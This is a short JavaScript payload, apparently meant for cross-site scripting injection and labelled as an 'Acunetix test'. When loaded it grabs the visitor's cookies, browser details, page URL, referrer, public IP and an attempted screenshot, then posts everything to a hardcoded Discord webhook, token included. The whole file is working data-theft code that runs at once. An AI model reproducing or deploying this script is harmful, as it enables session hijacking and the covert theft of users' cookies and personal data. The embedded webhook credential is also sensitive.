async function lekCaptureAcunetix() {
  try {
    // Pega cookies
    const cookies = document.cookie || 'No cookies found';

    // Pega infos básicas
    const userAgent = navigator.userAgent;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const url = window.location.href;
    const referrer = document.referrer || 'No referrer';

    // Pega IP (com fallback)
    let ip = 'unknown';
    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json', { mode: 'cors' });
      if (ipResponse.ok) {
        const ipData = await ipResponse.json();
        ip = ipData.ip;
      }
    } catch (e) {
      console.log('IP bloqueado:', e);
    }

    // Tenta screenshot (fallback pro DOM)
    let screenshot = 'Screenshot not supported';
    try {
      const canvas = document.createElement('canvas');
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      canvas.getContext('2d').drawImage(document.body, 0, 0);
      screenshot = canvas.toDataURL('image/jpeg', 0.3);
    } catch (e) {
      console.log('Screenshot falhou:', e);
    }

    // Monta payload
    const payload = {
      timestamp: new Date().toISOString(),
      cookies,
      userAgent,
      screenRes,
      url,
      referrer,
      ip,
      screenshot,
      source: 'GitHub raw - Acunetix test'
    };

    // Envia pro webhook
    try {
      await fetch('https://discord.com/api/webhooks/1395900711295782932/XO_ZAR7d0GTtr6SrVKzqKLCP1o_hXUj0aJUeIu2zT3ROJC80V2_ptFg8q9fVixv61waS', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        mode: 'cors'
      });
    } catch (e) {
      console.log('Webhook deu zica:', e);
    }

  } catch (e) {
    console.log('Lek deu pt no Acunetix:', e);
  }
}

// Roda na hora
lekCaptureAcunetix();
